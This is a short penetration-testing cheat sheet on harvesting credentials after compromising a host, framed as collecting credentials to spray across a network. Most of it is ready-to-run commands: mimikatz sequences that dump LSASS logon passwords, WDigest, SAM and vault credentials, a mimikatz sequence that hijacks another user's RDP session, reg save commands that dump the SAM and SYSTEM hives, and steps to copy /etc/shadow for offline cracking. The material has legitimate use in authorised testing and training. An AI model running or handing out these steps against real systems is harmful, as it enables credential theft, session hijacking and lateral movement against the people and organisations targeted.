---
description: >-
  After compromising a target is important to recollect the maximum credentials
  to spray them on the network.
---

# Get Credentials

## Looking for Interesting Files

If the target have a web  application that use a database try to find the `config.php` file in order to obtain the database connection.

Look what type of applications are installed and look for config files in order to find new pair of creds.

## Mimikatz

Dump all cached logon credentials, SAM, System, LSASS, VAULT....

```text
.\mimikatz.exe
privilege::debug 
sekurlsa::logonpasswords full
sekurlsa::wdigest
sekurlsa::credman
lsadump::sam
vault::cred
vault::list
ts::mstsc
ts::sessions



.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords full" "sekurlsa::wdigest" "sekurlsa::credman" "lsadump::sam" "vault::cred" "vault::list" "ts::mstsc" "exit"
```

## **Hijacking RDP Session**

To hijack a RDP session we need mimikatz.

```text
.\mimikatz.exe
privilege::debug
ts::sessions
ts::mstsc
token::elevate
ts::remote /id:3
```

## SAM and SYSTEM \(Win\)

You can easily dump the SAM and SYSTEM registries using the command prompt. Just open the `cmd.exe` as Administrator and run the following commands:

```text
reg save HKLM\SAM c:\windows\temp\sam
reg save HKLM\SYSTEM c:\windows\temp\system
```

Finally on our kali we just need to use `sam2dump` to get the hashes.

```text
samdump2 system sam > hashes.txt
```

## PASSWD and SHADOW \(Lin\)

Same as Windows, when we **pwn** a privilege user such as **root** we can get system users and passwords. In linux we just need to copy the following files to our attacking machine.

```text
/etc/passwd
/etc/shadow
```

Finally on our kali machine we just need to use `unshadow` to get the hashes:

```text
unshadow passwd shadow > hashes.txt
```









